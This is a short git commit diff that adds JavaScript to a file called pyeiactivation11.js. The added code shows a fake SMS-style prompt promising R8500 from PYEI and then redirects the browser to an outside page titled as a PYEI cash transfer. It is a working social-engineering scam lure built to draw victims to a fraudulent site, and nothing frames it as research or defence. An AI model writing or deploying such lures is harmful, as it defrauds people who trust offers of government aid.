ff7c26ea8a4381585f57506e4c035aabf1cb6414
help0z <triplerain29@gmail.com>
2026-08-26 09:22:11 +0100

    Update pyeiactivation11.js

--- pyeiactivation11.js
+++ pyeiactivation11.js
@@ -1,1 +1,8 @@
-pyeiactivation11.js
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive R8500 from PYEI. Press OK to WITHDRAW.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://gmoni.info/PYEI-Motsepe-Cash-Transfer.html';
+}
